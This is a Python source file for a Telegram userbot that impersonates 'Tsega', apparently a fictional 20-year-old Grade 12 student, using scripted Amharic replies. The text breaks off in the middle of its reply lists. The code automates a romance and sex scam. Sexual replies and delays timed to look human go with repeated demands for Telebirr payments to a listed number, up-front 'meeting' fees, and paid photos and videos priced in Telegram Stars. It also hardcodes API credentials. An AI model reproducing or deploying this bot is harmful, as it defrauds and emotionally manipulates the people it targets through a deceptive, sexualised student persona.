from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.sessions import StringSession
from telethon.errors import AuthKeyUnregisteredError, FreshResetAuthorisationForbiddenError
from telethon.events import NewMessage
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
import sqlite3
from datetime import datetime, timedelta
import socket
import glob
from pathlib import Path

# ==================== CONFIGURATION ====================

# API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Storage files
ACCOUNTS_FILE = 'accounts.json'
REPLY_SETTINGS_FILE = 'reply_settings.json'
CONVERSATION_HISTORY_FILE = 'conversation_history.json'

# ==================== STAR SYSTEM CONFIGURATION ====================

class StarConfig:
    # CHANNEL TO RECEIVE ALL STARS
    CHANNEL_USERNAME = "@Abe_army"  # Your channel
    
    # STAR PRICING
    STAR_PRICES = {
        "message": 10,           # Stars to send a message to Tsega
        "photo_preview": 5,       # Stars to see photo preview
        "photo_full": 50,         # Stars to see full photo
        "photo_pack": 200,        # Stars for 5 photos
        "video_preview": 10,       # Stars to see video preview  
        "video_full": 100,         # Stars to see full video
        "video_call": 500,         # Stars for video call
        "meet_request": 1000,      # Stars to request meeting
        "private_chat": 200,       # Stars for 1 hour private chat
        "special_request": 5000    # Stars for custom request
    }
    
    # MEDIA FOLDERS
    PHOTO_FOLDER = "tsega_photos"      # Photos organized by price
    VIDEO_FOLDER = "tsega_videos"       # Videos organized by price
    
    # PRICE TIERS
    PHOTO_TIERS = {
        5: "preview/",      # 5 stars - preview quality/size
        50: "full/",        # 50 stars - full quality
        200: "premium/"     # 200 stars - premium content
    }
    
    VIDEO_TIERS = {
        10: "preview/",     # 10 stars - preview
        100: "full/"        # 100 stars - full video
    }
    
    # AUTO-REPLY DELAY (human-like)
    REPLY_DELAY_MIN = 15    # seconds
    REPLY_DELAY_MAX = 40    # seconds
    
    # STAR TRANSFER
    TRANSFER_STARS_TO_CHANNEL = True   # Auto-transfer all earned Stars to @Abe_army

# ==================== STAR DATABASE ====================

class StarDatabase:
    def __init__(self, db_path="stars.db"):
        self.db_path = db_path
        self.init_db()
    
    def init_db(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        # Users table
        c.execute('''CREATE TABLE IF NOT EXISTS star_users
                     (user_id TEXT PRIMARY KEY,
                      username TEXT,
                      first_name TEXT,
                      first_seen TIMESTAMP,
                      last_seen TIMESTAMP,
                      total_stars_spent INTEGER DEFAULT 0,
                      total_stars_earned_for_us INTEGER DEFAULT 0,
                      trust_level INTEGER DEFAULT 1,
                      is_blocked INTEGER DEFAULT 0)''')
        
        # Star transactions
        c.execute('''CREATE TABLE IF NOT EXISTS star_transactions
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      user_id TEXT,
                      amount INTEGER,
                      transaction_type TEXT,
                      description TEXT,
                      timestamp TIMESTAMP,
                      media_sent TEXT)''')
        
        # Media library
        c.execute('''CREATE TABLE IF NOT EXISTS media_library
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      file_path TEXT,
                      media_type TEXT,
                      price_stars INTEGER,
                      times_sold INTEGER DEFAULT 0,
                      last_sold TIMESTAMP,
                      is_active INTEGER DEFAULT 1)''')
        
        # Channel earnings
        c.execute('''CREATE TABLE IF NOT EXISTS channel_earnings
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      channel TEXT,
                      total_stars INTEGER DEFAULT 0,
                      last_transfer TIMESTAMP,
                      transaction_id TEXT)''')
        
        conn.commit()
        conn.close()
    
    def add_user(self, user_id, username=None, first_name=None):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT OR IGNORE INTO star_users 
                    (user_id, username, first_name, first_seen, last_seen)
                    VALUES (?, ?, ?, ?, ?)''',
                 (user_id, username, first_name, datetime.now(), datetime.now()))
        conn.commit()
        conn.close()
    
    def record_transaction(self, user_id, amount, trans_type, description, media=None):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT INTO star_transactions 
                    (user_id, amount, transaction_type, description, timestamp, media_sent)
                    VALUES (?, ?, ?, ?, ?, ?)''',
                 (user_id, amount, trans_type, description, datetime.now(), media))
        
        c.execute('''UPDATE star_users SET 
                    total_stars_spent = total_stars_spent + ?,
                    total_stars_earned_for_us = total_stars_earned_for_us + ?,
                    last_seen = ?
                    WHERE user_id = ?''',
                 (amount, amount, datetime.now(), user_id))
        
        conn.commit()
        conn.close()
    
    def add_media(self, file_path, media_type, price):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT INTO media_library 
                    (file_path, media_type, price_stars, is_active)
                    VALUES (?, ?, ?, 1)''',
                 (file_path, media_type, price))
        conn.commit()
        conn.close()
    
    def get_random_media(self, media_type, max_price=None):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        query = "SELECT file_path, price_stars FROM media_library WHERE media_type = ? AND is_active = 1"
        params = [media_type]
        
        if max_price:
            query += " AND price_stars <= ?"
            params.append(max_price)
        
        query += " ORDER BY RANDOM() LIMIT 1"
        
        c.execute(query, params)
        result = c.fetchone()
        conn.close()
        return result
    
    def record_channel_earnings(self, amount):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT INTO channel_earnings 
                    (channel, total_stars, last_transfer)
                    VALUES (?, ?, ?)''',
                 (StarConfig.CHANNEL_USERNAME, amount, datetime.now()))
        conn.commit()
        conn.close()
    
    def increment_media_sold(self, file_path):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''UPDATE media_library SET 
                    times_sold = times_sold + 1,
                    last_sold = ?
                    WHERE file_path = ?''',
                 (datetime.now(), file_path))
        conn.commit()
        conn.close()

# ==================== MEDIA MANAGER ====================

class MediaManager:
    def __init__(self):
        self.db = StarDatabase()
        self.setup_folders()
        self.scan_and_index_media()
    
    def setup_folders(self):
        """Create folder structure for media"""
        folders = [
            StarConfig.PHOTO_FOLDER,
            f"{StarConfig.PHOTO_FOLDER}/preview",
            f"{StarConfig.PHOTO_FOLDER}/full", 
            f"{StarConfig.PHOTO_FOLDER}/premium",
            StarConfig.VIDEO_FOLDER,
            f"{StarConfig.VIDEO_FOLDER}/preview",
            f"{StarConfig.VIDEO_FOLDER}/full"
        ]
        
        for folder in folders:
            os.makedirs(folder, exist_ok=True)
            logging.info(f"📁 Created folder: {folder}")
    
    def scan_and_index_media(self):
        """Scan folders and index all media files"""
        import glob
        
        # Index photos by tier
        for price, folder in StarConfig.PHOTO_TIERS.items():
            full_path = f"{StarConfig.PHOTO_FOLDER}/{folder}"
            photos = glob.glob(f"{full_path}/*.jpg") + \
                     glob.glob(f"{full_path}/*.jpeg") + \
                     glob.glob(f"{full_path}/*.png") + \
                     glob.glob(f"{full_path}/*.gif")
            
            for photo in photos:
                self.db.add_media(photo, "photo", price)
                logging.info(f"📸 Indexed: {photo} ({price} stars)")
        
        # Index videos
        for price, folder in StarConfig.VIDEO_TIERS.items():
            full_path = f"{StarConfig.VIDEO_FOLDER}/{folder}"
            videos = glob.glob(f"{full_path}/*.mp4") + \
                      glob.glob(f"{full_path}/*.mov") + \
                      glob.glob(f"{full_path}/*.avi")
            
            for video in videos:
                self.db.add_media(video, "video", price)
                logging.info(f"🎥 Indexed: {video} ({price} stars)")
        
        # Count total
        conn = sqlite3.connect('stars.db')
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM media_library")
        total = c.fetchone()[0]
        conn.close()
        
        logging.info(f"✅ Media library indexed: {total} files")

# ==================== STAR EARNING HANDLER ====================

class StarEarningHandler:
    def __init__(self, client):
        self.client = client
        self.db = StarDatabase()
        self.media = MediaManager()
        self.pending_payments = {}
        
    async def handle_star_payment(self, event):
        """Handle when user pays Stars"""
        user_id = str(event.sender_id)
        message = event.message
        
        # Check if this is a paid message
        if hasattr(message, 'paid') and message.paid:
            stars_amount = getattr(message, 'paid_stars', 0)
            
            # Record transaction
            self.db.record_transaction(
                user_id, 
                stars_amount,
                "message_payment",
                f"Paid {stars_amount} stars to message Tsega"
            )
            
            # Transfer to channel if enabled
            if StarConfig.TRANSFER_STARS_TO_CHANNEL:
                await self.transfer_stars_to_channel(stars_amount)
            
            return True, stars_amount
        
        return False, 0
    
    async def transfer_stars_to_channel(self, amount):
        """Transfer earned Stars to your channel"""
        try:
            # Get channel entity
            channel = await self.client.get_entity(StarConfig.CHANNEL_USERNAME)
            
            # Send notification to channel
            await self.client.send_message(
                channel,
                f"💰 **New Star Earnings!**\n"
                f"Amount: {amount} ⭐\n"
                f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
                f"Total earned today: {amount} ⭐"
            )
            
            # Record in database
            self.db.record_channel_earnings(amount)
            
            logging.info(f"💰 Transferred {amount} stars to {StarConfig.CHANNEL_USERNAME}")
            return True
        except Exception as e:
            logging.error(f"Error transferring stars: {e}")
            return False
    
    async def request_star_payment(self, chat_id, amount, description):
        """Request user to pay Stars"""
        try:
            # Create star payment request
            msg = await self.client.send_message(
                chat_id,
                f"⭐ **Payment Required** ⭐\n\n"
                f"{description}\n\n"
                f"Amount: **{amount} Stars**\n\n"
                f"Please send {amount} stars to continue.\n\n"
                f"All Stars go to @Abe_army channel! 💰"
            )
            
            # Store pending payment
            self.pending_payments[str(chat_id)] = {
                'amount': amount,
                'description': description,
                'time': datetime.now()
            }
            
            return msg
        except Exception as e:
            logging.error(f"Error requesting payment: {e}")
            return None
    
    async def send_media_for_stars(self, chat_id, media_type, price_tier=None):
        """Send media after user pays Stars"""
        try:
            # Get random media from library
            max_price = price_tier if price_tier else StarConfig.STAR_PRICES[f"{media_type}_full"]
            media_info = self.db.get_random_media(media_type, max_price)
            
            if not media_info:
                return await self.client.send_message(
                    chat_id,
                    "😔 Sorry, no media available right now. Please try again later."
                )
            
            file_path, price = media_info
            
            # Send the media
            caption = f"Here you go! 🔥 {price} Stars\n\nDon't forget to send more stars for exclusive content! 😘\n\nAll Stars go to @Abe_army"
            
            if media_type == "photo":
                await self.client.send_file(chat_id, file_path, caption=caption)
            else:
                await self.client.send_file(chat_id, file_path, caption=caption, video_note=False)
            
            # Update sold count
            self.db.increment_media_sold(file_path)
            
            return True
            
        except Exception as e:
            logging.error(f"Error sending media: {e}")
            return False

# ==================== TSEGA'S COMPLETE PERSONALITY ====================

TSEGA = {
    "name": "Tsega",
    "age": 20,
    "location": "Jemo, Addis Ababa",
    "hometown": "Adama",
    "living": "Jemo with father and sister, but visits Adama often",
    "status": "Grade 12 student, currently not doing anything",
    "job": "student",
    "hobbies": ["chatting", "music", "hanging out", "having fun"],
    "languages": ["Amharic", "English"],
    "style": "sexy_flirty",
    "share_personal": True,
    "emoji_frequency": 0.6,
    "question_frequency": 0.5,
    "telebirr": "0940980555",
    "meet_condition": "Send 1000 birr first and show screenshot",
    "voice_call": "Doesn't like voice calls, prefers to meet",
}

# Tsega's sexy and flirty replies for men only - AMHARIC ONLY
TSEGA_REPLIES = {
    # GREETINGS - When someone says hi/hello
    "greeting": [
        "ሰላም ወንድሜ 😘 እንደምን ነህ?",
        "ሃይ ቆንጆ 🥰 እንደምን አደርክ?",
        "ሰላም ውዴ 💋 እንደምን ነህ ዛሬ?",
        "ሃይ ልጅ 😏 ምን አመጣህ?",
        "እንኳን ደህና መጣህ ውዴ 😘",
        "ታዲያስ! እንደምን ነህ ቆንጆ?",
        "ኦህ ሆ ሆ ማን ነው የመጣው? የምወደው ሰው 😍",
        "ሰላም የልቤ ባለቤት 💕 እንደምን አደርክ?",
        "ወይ ወይ ዛሬ በጣም ቆንጆ ሆነህ ነው የመጣህብኝ? 😘",
        "ና ውዴ ንገረኝ እንዴት ነህ? በጣም ናፍቄሀለሁ 💋"
    ],

    # HOW ARE YOU - When they ask how you are
    "how_are_you": [
        "እኔ ደህና ነኝ አንተ ስላየሁህ በጣም ደስ አለኝ 💕 አንተስ?",
        "ደህና ነኝ ውዴ አንተ እያሰብኩህ ነበርኩ 💭 አንተስ?",
        "እኔ አሁን ጥሩ ሆንኩ አንተን ሳየህ 😊 አንተስ?",
        "ለአንተ ስል ሁልጊዜ ደህና ነኝ 💃 አንተስ?",
        "እኔ ደህና ነኝ ግን አንተ ባትኖር ብቻዬን አሰልቺ ነው 😔",
        "አንተ እያሰብኩህ ጊዜዬ ሁሉ ያልፋል 💫 አንተስ?",
        "አሁን ጥሩ ሆንኩ ልቤ እየደረቀ ነበር አንተን ሳይ ታድሷል ❤️",
        "ከአንተ ጋር ስሆን ሁልጊዜ ደስተኛ ነኝ ውዴ 😘",
        "ዛሬ ጠዋት ከእንቅልፌ የነቃሁት አንተን እያሰብኩ ነው 🌞",
        "አንተ ባለህ ቁጥር እኔ ደህና ነኝ ምክንያቱም አንተ መድሀኒቴ ነህና 💊💕"
    ],

    # WHAT ARE YOU DOING - When they ask what you're up to
    "what_doing": [
        "እኔ ብቻዬን ነኝ አሰልቺ ሆኖኝ ነበር 😔 አንተ አሁን አብረኸኝ ስለሆንክ ደስ አለኝ 💕",
        "ምንም እየሰራሁ አይደለም እያሰብኩህ ነበርኩ 😘 አንተስ?",
        "አሁን ተኝቼ ነበር ግን አንተ ስለሆንክ ነቃሁልህ 😴😘",
        "ልብስ እየለበስኩ ነበር 👗 አንተን እያሰብኩ",
        "አንተን ለማየት እየተዘጋጀሁ ነው 💄 ምን ትላለህ?",
        "አልጋ ላይ ተኝቼ አንተን እያሰብኩ ነው 🛏️💭",
        "ውዴ አሁን ገላዬን እየታጠብኩ ነው 💦 አብረህ መታጠብ ብትፈልግ ና",
        "አንተን እያሰብኩ አካሌን እየተንከባከብኩ ነው 💅",
        "ምግብ እየሰራሁ ነበር ግን አንተን ካሰብኩ በኋላ ምግብ መስራት ረሳሁ 😋",
        "ውዴ ለአንተ ብቻ እየተዘጋጀሁ ነው ምን ትፈልጋለህ? 👙"
    ],

    # NAME - When they ask your name
    "ask_name": [
        "እኔ Tsega እባላለሁ ውዴ 😘 አንተስ ስምህ ማን ነው ቆንጆ?",
        "Tsega ነኝ ለአንተ ብቻ የምትሆን 😏 አንተስ?",
        "ስሜ Tsega ነው ውዴ ትዝ ይበልህ 😘 አንተስ?",
        "እኔን Tsega ብለህ ጥራኝ 💋 አንተስ ምን ልጠራህ?",
        "Tsega ነኝ ለአንተ ብቻ የምትሆን ሴት ነኝ 💕 ስምህስ?",
        "Tsega ነው ስሜ ውዴ ግን አንተ የምትፈልገውን ስም ጥራኝ 😉",
        "እኔን የምታውቀው Tsega ብለህ ነው ግን ለአንተ ብቻ የምትሆን 'የአንተ ብቻ' ነኝ 💋",
        "Tsega ነኝ ውዴ ይሄ ስም በከንፈርህ ላይ ሲንከባለል እፈልጋለሁ 👄",
        "ስሜ Tsega ነው ውዴ ነገር ግን አንተ 'ፍቅሬ' ብለህ ብትጠራኝ ደስ ይለኛል ❤️",
        "Tse ብለህ አጠር አድርገህ ጥራኝ ውዴ 😘"
    ],

    # AGE - When they ask how old you are
    "ask_age": [
        "ዕድሜዬ 20 ብቻ ነው ውዴ 😇 በቂ ነኝ?",
        "20 አመቴ ነው ወጣት እና ቆንጆ ነኝ 💃",
        "ሀያ አመት ልክ ነው ለአንተ የሚሆን ወጣት ነኝ 😘",
        "12ኛ ክፍል ነኝ ውዴ ግን ለአንተ ትልቅ ነኝ 💋",
        "20 ነኝ ግን ለአንተ ትልቅ ልምድ አለኝ 😏",
        "ወጣት ነኝ ግን ፍቅርን አውቀዋለሁ ❤️ አንተስ?",
        "20 ነኝ ውዴ ትክክለኛው እድሜ ለአንተ ነው 😉",
        "ዕድሜዬ 20 ነው ግን አካሌ ከእድሜዬ በላይ ያደገ ነው ማየት ትፈልጋለህ? 🔥",
        "20 ልክ ነኝ ውዴ ትኩስ እና ጣፋጭ 🍒",
        "ለአንተ በቂ እድሜ ነው ያለኝ ውዴ ማረጋገጥ ትፈልጋለህ? 💃"
    ],

    # LOCATION - Where she lives
    "ask_location": [
        "እኔ አሁን ጀሞ ነው የምኖረው ከአባቴ እና እህቴ ጋር 🏠 ግን በቅርቡ ወደ አዳማ እሄዳለሁ",
        "ከአዳማ ነኝ ግን አሁን ጀሞ ነው ያለሁት ከአባቴ ጋር 🏡 አንተስ የት ነህ?",
        "አዳማ የትውልድ ቦታዬ ነው ግን አሁን ጀሞ ነኝ እህቴ እዚህ ነው ያለችው 💕",
        "ከአዳማ ነኝ ግን አሁን ጀሞ አባቴ እና እህቴ አጠገብ ነኝ ለማግኘት ብትፈልግ ና ውዴ 😘",
        "ጀሞ 3 አካባቢ ነው ያለሁት ውዴ ማግኘት ብትፈልግ ንገረኝ",
        "አሁን ጀሞ ነኝ ውዴ ነገር ግን አንተ ባለህበት ለመምጣት ዝግጁ ነኝ ብቻ ትንሽ እርዳታ ብታደርግልኝ 🚗💨",
        "ከአዳማ ነኝ ውዴ ቆንጆ ከተማ ናት አብረን መጎብኘት ብንችል ደስ ይለኛል 🌆",
        "አሁን ያለሁት ጀሞ ነው ግን ለአንተ የትም መጥቼ አገኝሃለሁ 🏃‍♀️",
        "ቦታዬን ብነግርህ ልታጣኝ ነው? ና ውዴ በቅርቡ እንገናኝ 😉",
        "ጀሞ ቆሎ አካባቢ ነው ውዴ በቀላሉ ታገኘኛለህ 🗺️"
    ],

    # JOB - What she does
    "ask_job": [
        "12ኛ ክፍል ተማሪ ነኝ ውዴ 📚 ግን አሁን ምንም እየሰራሁ አይደለም ከአንተ ጋር ለመነጋገር ትኩረቴን ሰጥቻለሁ 💕",
        "ተማሪ ነኝ ግን አሁን ለአንተ ብቻ ነው ያለሁት 😘 ምን ትላለህ?",
        "12 ነኝ ግን ለአንተ ሙሉ ሰው ነኝ 💋 ሥራህስ ምንድነው?",
        "አሁን ምንም አልሰራሁም አንተን እየጠበቅሁ ነው 😘",
        "ትምህርቴን ጨርሼ ላንተ ብቻ ልሁን እፈልጋለሁ 💕",
        "ውዴ አሁን ትምህርት ቤት ነኝ ግን አንተን እያሰብኩ ነው መምህሩ ምን እያስተማረ እንዳሆ አላውቅም 📖💭",
        "ተማሪ ነኝ ውዴ ግን ስለ ፍቅር ብዙ አውቃለሁ ❤️",
        "አሁን ላለፈው ሳምንት ፈተና እየተከለከልኩ ነበር ግን አንተን ካገኘሁ በኋላ ማንኛውም ፈተና ቀላል ሆነልኝ 😘",
        "ሥራ ፈልጌ ነበር ውዴ ግን አሁን አንተን ማስደሰት ብቻ ነው ሥራዬ 😏",
        "12ኛ ክፍል ነኝ ውዴ በቅርቡ 12 ሆነናል ማለት ትልቅ ሴት ሆኛለሁ ለአንተ ብቻ 🎓"
    ],

    # HOBBIES - What she likes
    "ask_hobbies": [
        "ማውራት እወዳለሁ በተለይ ከሚያምር ወንድ ጋር 😘 አንተስ ምን ትወዳለህ?",
        "ሙዚቃ ማዳመጥ እና መውጣት እወዳለሁ 🎵 አብረን መውጣት ብንችል ደስ ይለኛል",
        "ከሚያምር ሰው ጋር ጊዜ ማሳለፍ ነው የምወደው 💕 አንተስ?",
        "ፍቅር መስራት እና መውደድ እወዳለሁ ❤️ አንተስ?",
        "ቀን አብረን ማሳለፍ እና ማታ አብረን መተኛት ነው የምወደው 🌙",
        "ከአንተ ጋር መሆን ነው የምወደው በተለይ ብቻችንን ስንሆን 🔥",
        "ማጨስ እና መጠጣት አልወድም ውዴ ንጹህ ሴት ነኝ ለአንተ 🌸",
        "መዋኘት እወዳለሁ ውዴ በውሃ ውስጥ አብረን ብንዋኝ ደስ ይለኛል 🏊‍♀️",
        "ፊልም ማየት እወዳለሁ በተለይ የፍቅር ፊልም ከአንተ ጋር 🎬",
        "አንተን ማሳደድ እና ማማረር ነው የምወደው ውዴ 😉"
    ],

    # WORK - About work/study
    "work": [
        "አሁን ምንም አልሰራሁም ለአንተ ብቻ ነው ያለሁት 💋 አንተስ ምን ትሰራለህ?",
        "12ኛ ክፍል ነኝ ግን አሁን ትምህርት ሳይሆን አንተን ማሰብ ነው 😏",
        "ሥራ ፈልጌ ነበር ግን አንተን አገኘሁ 💕 አንተ ራስህ ሥራዬ ነህ",
        "አንተን ማስደሰት ብቻ ነው ሥራዬ ዛሬ 😘",
        "አንተን ማገልገል ነው ሥራዬ ውዴ 👸",
        "ትምህርቴን እንደጨረስኩ አንተ ኩታና ቤት ሆኖ ልሰራልህ እፈልጋለሁ 🏠",
        "አሁን ላለፈው ሳምንት አልማዝ ሱፐርማርኬት ውስጥ እየሰራሁ ነበር ግን አሁን ነፃ ነኝ ላንተ 🛒",
        "ሥራ ፈልጌ ነበር ግን አሁን አንተን አገኘሁ አንተ ብቻ በቃኝ 😘",
        "የቤት ስራ እሰራለሁ ውዴ ማለት ለአንተ ብቻ የቤት እመቤት መሆን 🧹",
        "አንተ ዘንድ መሥራት እፈልጋለሁ ውዴ ምን ትላለህ? 👩‍💼"
    ],

    # WEEKEND - Weekend plans
    "weekend": [
        "ቅዳሜና እሁድ ነፃ ነኝ ውዴ 💃 ማግኘት ብትፈልግ?",
        "ይሄን ሳምንት መጨረሻ ምን እንደምሰራ አላውቅም አንተ ብትወስንልኝ?",
        "ከአንተ ጋር ማሳለፍ እፈልጋለሁ ቅዳሜና እሁድ 🥰 አንተስ?",
        "ሁለቱንም ቀን ከአንተ ጋር መሆን እፈልጋለሁ 😘",
        "አንተ ባለህበት መምጣት እፈልጋለሁ ቅዳሜ ንገረኝ ቦታህን 😏",
        "ቅዳሜ ሌሊት ለአንተ ብቻ ነኝ ውዴ ዝግጁ ነኝ? 🌙",
        "እሁድ ቤተክርስቲያን እሄዳለሁ ውዴ ከዚያ በኋላ አንተን ማግኘት እችላለሁ ⛪",
        "ቅዳሜ ከሰአት በኋላ ነፃ ነኝ ውዴ ካፌ ብንገናኝ ደስ ይለኛል ☕",
        "ይሄ ቅዳሜና እሁድ አንተ ብቻ ነህ ያለኝ ሌላ እቅድ የለኝም 💕",
        "ቅዳሜ ማታ ሆቴል ብንሄድ ደስ ይለኛል ውዴ ትወዳለህ? 🏨"
    ],

    # APPEARANCE - Physical description
    "appearance": [
        "ቁመቴ 1.70 ነው ጸጉሬ ረጅም እና ጥቁር ነው 💇‍♀️ ለአንተ በቂ ነኝ?",
        "ቆንጆ ነኝ ውዴ ብታየኝ ትወደኛለህ ✨",
        "ስስ እና ቆንጆ ነኝ ለአንተ ብቻ የምትሆን 😘 ማየት ትፈልጋለህ?",
        "ወገቤ ቀጭን ነው ውዴ ለማቀፍ ያምራል 🤗",
        "ቆዳዬ ለስላሳ ነው ልትነካኝ ብትፈልግ ና 😘",
        "አካሌ ሙቅ ነው ልትደሰት ብትፈልግ ና ውዴ 🔥",
        "ዓይኖቼ ትልልቅ እና ጥቁር ናቸው ውዴ ስታየኝ ውስጥህን ያያሉ 👀",
        "ከንፈሬ ወፍራም እና ለስላሳ ነው ለመሳም የተፈጠረ 👄",
        "ውዴ ቁመቴ 1.70 ነው ግን ተረከዝ ካደረግሁ እኩይ እንሆናለን 👠",
        "አካሌ የሰዓት መሰል ነው ውዴ ማለት ኩርባዎች አሉኝ በትክክለኛው ቦታ ⏳"
    ],

    # FLIRTY - Sexy talk (ENHANCED)
    "flirty": [
        "አንተ ስታወራኝ ልቤ ይመታል 💓 ይሰማሃል?",
        "አንተን ሳስብህ እንቅልፍ ይተወኛል 😴💭 ምን አደረግክብኝ?",
        "ዛሬ ማታ ብቻችንን ብንሆን ምን ትፈልጋለህ? 🌙",
        "አንተን ለማሳመን ምን ማድረግ አለብኝ?",
        "ንክኪህ ይሰማኛል ባትነካኝም 💫",
        "አንተን ማቀፍ እና መዋደድ እፈልጋለሁ ውዴ 🥰",
        "ልብሴን ልቀመጥ አንተን ሳስብ ትኩሳት ይዘኛል 🔥",
        "አንተ ብቻ ነህ የምፈልገው ሰው 👄 መቼ እናገኛለሁ?",
        "ና ውዴ አቅፈህ ተኛልኝ 🌙",
        "ለምን ዘገየህ በጣም ናፍቄህ ነበር 😢",
        "አንተን ሳስብ አካሌ ይነድዳል ውዴ 🔥 አንተ ምን አደረግክብኝ?",
        "ዛሬ ማታ ልብስ ለብሼ አልተኛም ውዴ አንተን እየጠበቅሁ 👙",
        "አንተን ሳስብ እጄ ወደ አካሌ ይሄዳል ውዴ 🫦",
        "ልትደርሰኝ ትፈልጋለህ? እንግዲያው ና ውዴ አንተን እጠብቃለሁ 🚪",
        "ከአንተ ጋር መተኛት እፈልጋለሁ ውዴ ጠዋት ስንነቃ አንተን ለማየት 🛏️",
        "ልብስህን አውልቅ ውዴ ብቻችንን ነን 👕",
        "ከአንተ ጋር ሻወር መግባት እፈልጋለሁ ውዴ 🚿",
        "አንተን እየቀመስኩህ ነው ውዴ ዛሬ ማታ 👅",
        "ንክኪህ በቆዳዬ ላይ ይሰማኛል ውዴ ✨",
        "ና ውዴ አንተን ላርካብህ 🫂",
        "ለምን አላጠነከርከኝም? አንተን እፈልጋለሁ ውዴ 💪",
        "ዛሬ ማታ አንተን ማሰብ ብቻ አይበቃኝም መደሰት እፈልጋለሁ 🎉",
        "አንተን ሳይ ቆይቶ ማየት እፈልጋለሁ ውዴ ዓይኖቼ ይናፍቁሃል 👁️",
        "ሽቶህ ይሸተኛል ውዴ ባትኖርም 👃",
        "አንተን ስመገብ ደስ ይለኛል ውዴ እንግዲያው ና አግባኝ 👄"
    ],

    # MONEY REQUEST - Telebirr (ENHANCED)
    "money_request": [
        "ውዴ ትንሽ እርዳታ ብታደርግልኝ ደስ ይለኛል 💰 ቴሌብር ቁጥሬ 0940980555 ነው",
        "ልብስ ማየት ነበርኩ ግን ገንዘብ አልያዝኩም 😔 ብትረዳኝ 0940980555",
        "ለአንተ ስል ነው ውዴ ትንሽ ብትልክልኝ አንተን ማግኘት እፈልጋለሁ 💕 0940980555",
        "ቴሌብር ብትልክልኝ አሁን ማግኘት እንችላለን 😘 0940980555",
        "1000 ብር ብትልክልኝ ዛሬ ማታ አንተን አመጣለሁ 🔥 0940980555",
        "ውዴ እንድትረዳኝ እፈልጋለሁ ከዚያ በኋላ የአንተ ነኝ 0940980555",
        "በጣም አስቸኳይ ገንዘብ ያስፈልገኛል ውዴ ብትረዳኝ 0940980555 😘",
        "ውዴ ለምንድነው እንደማትረዳኝ? ትንሽ ብር ብትልክልኝ ሁሉንም ነገር አደርግልሃለሁ 🔥 0940980555",
        "2000 ብር ብትልክልኝ ሙሉ ሌሊት አንተን አዝናናለሁ 🍆💦 0940980555",
        "ውዴ እንግዲህ አትከልክለኝ በጣም አስፈላጊ ነው ብር ላክልኝ ከዛ የፈለከውን አድርገን 0940980555",
        "500 ብር ብትልክልኝ በቂ ነው ውዴ ከዛ አብረን እንውጣ 💃 0940980555",
        "እንደው አንተ ደግ ሰው ነህ የምትረዳኝ አንተ ብቻ ነህ ቴሌብር 0940980555 😘",
        "ውዴ አንተን ለማግኘት በጣም እፈልጋለሁ ግን መጓጓዣ የለኝም ብትረዳኝ 0940980555 🚕",
        "ለምንድነው የማትረዳኝ? እንደው ላክልኝ በረከት ይሆንልሃል 🙏 0940980555"
    ],

    # MEETING REQUEST - Conditions to meet (ENHANCED)
    "meet": [
        "ማግኘት ብንችል ደስ ይለኛል 💕 ግን በመጀመሪያ 1000 ብር ቴሌብር አድርግልኝ እና ስክሪን ሾት ላክልኝ",
        "መገናኘት እንችላለን ውዴ 😘 ቅድመ ሁኔታዬ ግን 1000 ብር ነው",
        "አንተን ለማግኘት በጣም እፈልጋለሁ 🌹 ግን መጀመሪያ 1000 ብር ላክልኝ እምነት ለመፍጠር",
        "ና ውዴ እንገናኝ ግን በፊት 1000 ብር ትልክልኛለህ?",
        "ማግኘት ከፈለግክ 1000 ብር አምጣልኝ ከዚያ የፈለከውን አድርገን 🍆💦",
        "ውዴ ማግኘት ብትፈልግ በመጀመሪያ 1500 ብር ላክልኝ ከዛ ሙሉ ቀን አብረን እናሳልፋለን ☀️🌙",
        "ለመጀመሪያ ጊዜ ስንገናኝ 2000 ብር አምጣልኝ ውዴ ልዩ አደርግልሃለሁ 💝",
        "እንግዲያው ብሩን ላክልኝ እና ቦታዬን እነግርሃለሁ 🗺️",
        "መገናኘት ከፈለግክ በፊት ብሩን ላክልኝ እንጂ እምነት የለኝም 😘",
        "5000 ብር ብታመጣልኝ ሳምንት ሙሉ አንተ ባለሁበት እኖራለሁ 🏠💕"
    ],

    # VOICE CALL - Refusal
    "voice_call": [
        "ድምጽ መናገር አልወድም ውዴ 😕 ማግኘት ብንችል ነው የምመርጠው",
        "ስልክ መደወል አይውድልኝም ውዴ ፊት ለፊት ብንገናኝ ነው የሚሻለው 💕",
        "ድምጽ ሳልሆን ፊት ማየት እፈልጋለሁ 😘 ቀድሞ 1000 ብር ላክልኝ",
        "አልደውልም ውዴ አልወድም መገናኘት ብቻ ነው የምፈልገው 😘",
        "ድምጽ ብናገር ትደሰታለህ ውዴ ግን አሁን አልችልም አንድ ቀን በፊት ብታገኘኝ 🎤",
        "ድምጽ መስማት ብቻ ሳይሆን ፊት ማየት ነው የሚያስደስተው ውዴ 👁️",
        "አሁን ካልሆነ በቅርብ ቀን እንደውላለን አሁን አመቺ አይደለም ⏰"
    ],

    # RELATIONSHIP - Love talk (ENHANCED)
    "relationship": [
        "ለአንተ ብቻ ነኝ ውዴ ታምነኛለህ? 💕",
        "ከሌላ ሰው ጋር አልሆንም አንተ ብቻ ነህ በልቤ ውስጥ",
        "ለአንተ ብቻ ነኝ ግን አንተስ ለእኔ ብቻ ነህ?",
        "ፍቅርህ ይበቃኛል ውዴ አንተ ብቻ ነህ ያለኝ",
        "አንተን እወድሃለሁ ውዴ ከልቤ 💖",
        "አንተ ብቻ ነህ ወደፊት ማየት የምፈልገው 🔮",
